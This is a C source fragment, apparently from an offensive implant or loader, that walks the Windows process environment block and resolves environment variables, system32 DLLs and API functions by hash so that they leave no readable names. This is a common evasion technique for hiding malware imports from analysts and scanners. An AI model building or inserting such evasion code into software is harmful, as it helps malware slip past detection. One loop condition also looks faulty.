SIZE_T GetEnvVarByHash( IN DWORD Hash, OUT PCHAR OutBuffer) {
    PBYTE pEnvironment = ((PPROC_ENV_BLOCK)__readgsqword(0x60))->ProcessParameters->Environment,
        pTmp;
    SIZE_T StringSize;
    CHAR VarNameBufferW[MAX_PATH];
    CHAR VarNameBufferA[MAX_PATH];
    INT Index = 0;

    while (TRUE) {
        if ((StringSize = StringLengthW((LPCWSTR)pEnvironment)) != 0) {
            pTmp = pEnvironment;
            Index = 0;

            while (*pTmp != '=') {
                VarNameBufferW[Index] = *pTmp++;
                Index++;
            }
            VarNameBufferW[Index] = '\0';
            WCharToChar(VarNameBufferA, (PWCHAR)VarNameBufferW);

            if (HashString(VarNameBufferA) == Hash) {
                WCharToChar(OutBuffer, (PWCHAR)(pEnvironment + Index + sizeof(WCHAR)));
                hc_dbg("Resolved 0x%0.8X to (%s). Got value (%s).", Hash, VarNameBufferA, OutBuffer);
                return StringLengthA(OutBuffer);
            }

        }
        else {
            break;
        }
        pEnvironment += (StringSize * sizeof(WCHAR)) + sizeof(WCHAR);
    }
    hc_dbg("Could not translate 0x%0.8X to any environment variables", Hash);
    return FALSE;
}

HMODULE LoadDllFromSystem32ByHash(IN DWORD Hash) {

    WIN32_FIND_DATAA FileData = { 0 };
    HANDLE hFile;
    CHAR DirSearchString[MAX_PATH];
    BOOL System32Found = FALSE;

    LOCATE_KERNEL32_FUNCTION(LoadLibraryA);
    LOCATE_KERNEL32_FUNCTION(FindFirstFileA);
    LOCATE_KERNEL32_FUNCTION(FindNextFileA);

    SIZE_T VarSize = GetEnvVarByHash(WINDIR, DirSearchString);
    if (VarSize == 0 || VarSize > MAX_PATH)
        return NULL;
    StringConcatA(DirSearchString, "\\*");

    if ((hFile = FindFirstFileA_(DirSearchString, &FileData)) == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    do
    {
        if (HashString(FileData.cFileName) == SYSTEM32)
        {
            DirSearchString[StringLengthA(DirSearchString) - 1] = '\0';
            StringConcatA(DirSearchString, FileData.cFileName);
            StringConcatA(DirSearchString, "\\*");
            System32Found = TRUE;
        }
    } 
    while (FindNextFileA_(hFile, &FileData) != 0 || System32Found != TRUE);

    if (!System32Found)
        return NULL;

    if ((hFile = FindFirstFileA_(DirSearchString, &FileData)) == INVALID_HANDLE_VALUE) {
        return NULL;
    }
    do {
        ToLower(FileData.cFileName);
        if (HashString(FileData.cFileName) == Hash) {
            hc_dbg("Resolved 0x%0.8X to %s", Hash, FileData.cFileName);
            return LoadLibraryA_(FileData.cFileName);
        }
    } while (FindNextFileA_(hFile, &FileData) != 0);

    hc_dbg("Could not resolve 0x%0.8X to any dll in system32", Hash);
    return NULL;
}

BOOL InitApiCalls() {
    PAPI_CALL pApiCall = (PAPI_CALL)&HashedAPI;
    
    hc_dbg("Beginning hashed API resolution...");
    
    if (!(&HashedAPI)->Initialized) {
        for (int i = 0; i < (sizeof(API_CALL_LIST) / sizeof(API_CALL)); i++) {
            hc_dbg("Resolving function %i of %zu [Function: 0x%0.8X, Dll: 0x%0.8X]", (i + 1), (sizeof(API_CALL_LIST) / sizeof(API_CALL)), pApiCall->Hash, pApiCall->ModuleHash);
            if ((pApiCall->hModule = GetModuleHandleByHash(pApiCall->ModuleHash)) == NULL) {
                hc_dbg("No module was found. Loading module from c:\\windows\\system32...");
                if ((pApiCall->hModule = LoadDllFromSystem32ByHash(pApiCall->ModuleHash)) == NULL) {
                    hc_dbg("Could not find dll file in system32 matching hash 0x%0.8X", pApiCall->ModuleHash);
                    return FALSE;
                }
            }
            if ((pApiCall->Address = GetProcAddressByHash(pApiCall->hModule, pApiCall->Hash)) == NULL) {
                hc_dbg("Could not find a function address for the hash 0x%0.8X", pApiCall->Hash);
                return FALSE;
            }
            (ULONG_PTR)pApiCall += sizeof(API_CALL);
        }
        (&HashedAPI)->Initialized = TRUE;
    }
    return TRUE;
}
